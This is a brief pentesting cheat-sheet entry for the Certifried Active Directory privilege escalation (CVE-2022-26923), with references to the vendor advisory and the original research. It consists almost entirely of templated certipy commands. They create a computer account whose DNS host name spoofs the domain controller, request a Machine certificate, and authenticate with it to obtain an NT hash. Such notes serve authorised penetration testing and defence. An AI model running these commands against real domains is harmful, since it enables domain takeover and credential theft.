### Prerequisites
```
WriteACL on computeraccount
Existence of machine certificate template
```

### Create computeraccount and change dNSHostName attribute to domainController.domain:
```
certipy account create '<domain>/<user>:<password>@<fqdnDomainController>' -user '<newComputer>' -dns '<fqdnDomainController>'
```

### Request certificate
```
certipy req '<domain>/<user>:<password>@<fqdnDomainController>' -ca '<certificateAuthority>' -template 'Machine'
```

### Get NT hash
```
$> certipy auth -pfx '<file>.pfx' -username '<user>' -domain '<domain>' -dc-ip <domainController>
```

### References
* https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923
* https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4

